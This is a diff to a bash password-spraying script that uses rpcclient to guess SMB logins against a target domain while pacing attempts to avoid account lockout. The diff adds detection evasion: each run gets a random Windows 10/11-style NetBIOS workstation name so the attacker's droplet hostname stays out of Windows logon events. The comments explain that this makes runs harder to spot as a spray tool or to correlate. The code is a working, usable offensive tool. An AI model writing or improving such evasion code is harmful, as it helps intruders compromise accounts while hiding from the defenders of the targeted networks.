@@ -6,6 +6,7 @@ if [ $# -eq 0 ] || [ "$1" == "-help" ] || [ "$1" == "-h" ] || [ "$1" == "--help"
     echo "This script will password spray a target over a period of time"
     echo "It requires password policy as input so accounts are not locked out"
     echo "Useage: spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <Domain> <OptionalSkipUsernameUsernameSpray>"
+    echo "  Tip: set SPRAY_NETBIOS_NAME=<name> to control the client name the target logs (hides your droplet hostname)."
     echo -e "Example: spray.sh -smb 192.168.0.1 users.txt passwords.txt 1 35 CORPORATION\n"
     echo -e "Example Skipping Username:Username Spray: spray.sh -smb 192.168.0.1 users.txt passwords.txt 1 35 CORPORATION NOUSERUSER\n"
 
@@ -116,6 +117,17 @@ if [ "$1" == "-smb" ] || [ "$1" == "--smb" ] || [ "$1" == "smb" ] ; then
     set +H
     domain=$7
     nouseruser=$8
+    # Client name reported to the target in the SMB session + the NTLM "Workstation
+    # Name" field. Without -n both default to the local hostname (your droplet name),
+    # which the client sees in security event 4624. "UNKNOWN" reads as a spray tool
+    # and a fixed value is correlatable across runs, so by default we emit a fresh
+    # random Windows 10/11-style name (DESKTOP-XXXXXXX) each invocation. Pin a
+    # specific one with SPRAY_NETBIOS_NAME. Truncated to 15 (the NetBIOS limit).
+    netbiosname="$SPRAY_NETBIOS_NAME"
+    if [ -z "$netbiosname" ]; then
+        netbiosname="DESKTOP-$(printf '%07X' $((RANDOM * 65536 + RANDOM)))"
+    fi
+    netbiosname="${netbiosname:0:15}"
     target=$2
     cp $3 logs/username-removed-successes.txt
     userslist="logs/username-removed-successes.txt"
@@ -130,7 +142,7 @@ if [ "$1" == "-smb" ] || [ "$1" == "--smb" ] || [ "$1" == "smb" ] ; then
         time=$(date +%H:%M:%S)
         echo "$time Spraying with password: Users Username"
         for u in $(cat $userslist); do 
-        	(echo -n "[*] user $u%$u " && rpcclient -U "$domain/$u%$u" -c "getusername;quit" $target) >> logs/spray-logs.txt 2>&1
+        	(echo -n "[*] user $u%$u " && rpcclient -n "$netbiosname" -U "$domain/$u%$u" -c "getusername;quit" $target) >> logs/spray-logs.txt 2>&1
         done
         cat logs/spray-logs.txt | grep -v "Cannot"
         counter=$(($counter + 1))
@@ -145,7 +157,7 @@ if [ "$1" == "-smb" ] || [ "$1" == "--smb" ] || [ "$1" == "smb" ] ; then
         time=$(date +%H:%M:%S)
     	echo "$time Spraying with password: $password"
     	for u in $(cat $userslist); do 
-    		(echo -n "[*] user $u%$password " && rpcclient -U "$domain/$u%$password" -c "getusername;quit" $target) >> logs/spray-logs.txt 2>&1
+    		(echo -n "[*] user $u%$password " && rpcclient -n "$netbiosname" -U "$domain/$u%$password" -c "getusername;quit" $target) >> logs/spray-logs.txt 2>&1
     	done
         cat logs/spray-logs.txt | grep -v "Cannot"
         cat logs/spray-logs.txt | grep -v "Cannot" | cut -d ' ' -f 3 | cut -d '%' -f 1 | sort -u > logs/usernamestoremove.txt
